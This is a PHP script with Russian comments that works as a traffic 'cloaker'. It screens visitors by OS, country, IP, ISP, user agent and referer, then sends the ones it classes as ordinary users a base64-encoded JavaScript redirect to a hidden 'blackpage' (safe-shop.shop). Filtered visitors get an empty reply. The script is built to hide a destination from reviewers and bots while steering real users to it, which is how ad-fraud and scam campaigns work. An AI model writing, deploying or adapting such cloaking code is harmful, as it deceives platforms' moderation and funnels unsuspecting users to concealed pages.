<?php
// Разместить в корне сайта

// Включаем доступ к скрипту сторонним сайтам
header('Access-Control-Allow-Origin: *');

//Включение отладочной информации
ini_set('display_errors','1'); 
ini_set('display_startup_errors', 1); 
error_reporting(E_ALL);
//Конец включения отладочной информации

require 'core.php';
include 'settings.php';

//передаём все параметры в кло
$cloacker = new Cloacker();
$cloacker->os_white = $os_white; 
$cloacker->country_white = $country_white;
$cloacker->ip_black = $ip_black; 
$cloacker->tokens_black = $tokens_black;
$cloacker->ua_black = $ua_black;
$cloacker->block_without_referer = $block_without_referer;
$cloacker->isp_black = $isp_black;

//Проверяем зашедшего пользователя
$check_result = $cloacker->check();
if (!isset($cloacker->result))
	$cloacker->result=['OK'];

if ($check_result == 0 ||$disable_tds) //Обычный юзверь или отключена фильтрация
{
	$redirect_rule = 0; // Если 0, то редиректим на БлекПейдж
} 

// Адрес нашего blackpage
$redirect_url = "https://safe-shop.shop/";


$phpjsresponse = "<script type='text/javascript'>
  document.location.href='{$redirect_url}';
</script>";

// Отдаем закодированный код js редиректа
if ($redirect_rule === 0)
	echo base64_encode($phpjsresponse);
else
	echo '';